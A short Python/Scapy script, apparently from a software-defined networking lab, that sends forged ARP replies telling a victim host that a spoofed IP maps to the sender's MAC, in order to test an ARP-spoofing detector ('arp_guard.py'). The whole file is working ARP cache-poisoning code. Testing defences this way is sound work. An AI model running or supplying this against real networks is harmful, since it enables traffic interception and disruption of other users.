#!/usr/bin/env python3
import argparse
import time

from scapy.all import Ether, ARP, sendp, get_if_hwaddr


def build_forged_arp_reply(iface, victim_ip, spoof_ip):
    attacker_mac = get_if_hwaddr(iface)
    eth = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")
    arp_reply = ARP(
        op=2,
        hwsrc=attacker_mac,
        psrc=spoof_ip,
        hwdst="ff:ff:ff:ff:ff:ff",
        pdst=victim_ip,
    )
    return eth / arp_reply


def main():
    parser = argparse.ArgumentParser(description="Forged ARP reply generator (for DAI testing)")
    parser.add_argument("--iface", required=True, help="e.g. h3-eth0")
    parser.add_argument("--victim-ip", required=True, help="IP of the host being poisoned")
    parser.add_argument("--spoof-ip", required=True, help="IP address being impersonated")
    parser.add_argument("--count", type=int, default=10, help="Number of forged packets to send")
    parser.add_argument("--interval", type=float, default=1.0, help="Seconds between packets")
    args = parser.parse_args()

    pkt = build_forged_arp_reply(args.iface, args.victim_ip, args.spoof_ip)

    print("[attacker.py] Sending %d forged ARP replies on %s:" % (args.count, args.iface))
    print("              telling %s that %s is at MY mac (%s)" % (
        args.victim_ip, args.spoof_ip, pkt[Ether].src
    ))
    print("              Expected result: arp_guard.py should detect the mismatch,")
    print("              drop these packets, and install a quarantine flow for my MAC/port.")

    for i in range(args.count):
        sendp(pkt, iface=args.iface, verbose=False)
        print("  sent %d/%d" % (i + 1, args.count))
        time.sleep(args.interval)


if __name__ == "__main__":
    main()
